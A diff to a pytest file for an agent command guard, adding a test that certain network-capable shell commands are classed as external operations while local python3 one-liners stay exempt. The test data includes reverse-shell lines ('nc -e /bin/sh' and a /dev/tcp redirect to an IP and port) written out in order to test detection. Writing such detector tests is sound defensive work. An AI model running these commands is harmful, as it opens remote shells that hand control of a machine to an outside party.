@@ -4,7 +4,7 @@ import pytest
 
 from axiom.modules.guard.defaults import HARD_BLOCK_RULES, SYSTEM_PROMPT
 from axiom.modules.guard.policy import evaluate
-from axiom.modules.guard.policy import _external_operation, _parse_verdict
+from axiom.modules.guard.policy import _external_operation, _parse_verdict, normalize
 from axiom.modules.guard.schemas import GuardRequest
 from axiom.modules.settings.schemas import RuntimeConfig
 
@@ -417,3 +417,25 @@ def test_guard_disables_model_thinking_by_default(client) -> None:
     # measured 5.5-12.2s per call against a 3s timeout, usually timing out.
     config = RuntimeConfig(guard_mode="enforce")
     assert config.guard_thinking_enabled is False
+
+
+def test_network_capable_commands_are_not_treated_as_local() -> None:
+    # These reach the network without a literal URL or a known verb, so the old
+    # detector filed them as "local operations" and never consulted the judge.
+    for command in (
+        'python3 -c "import requests; requests.get(h)"',
+        'python3 -c "import socket; s=socket.socket()"',
+        'perl -e "use IO::Socket::INET"',
+        "exec 3<>/dev/tcp/1.2.3.4/4444",
+        "nc -e /bin/sh 1.2.3.4 4444",
+    ):
+        assert _external_operation(normalize("bash", {"command": command})), command
+
+    # The same python3 -c form, doing local work, must stay exempt - the worker
+    # uses it for nearly all housekeeping.
+    for command in (
+        'python3 -c "import json; d=json.load(open(\'graph.json\')); print(len(d))"',
+        'python3 -c "import sys; print(sys.argv)"',
+        "cat /var/lib/axiom/contexts/t_231/graph.json",
+    ):
+        assert not _external_operation(normalize("bash", {"command": command})), command
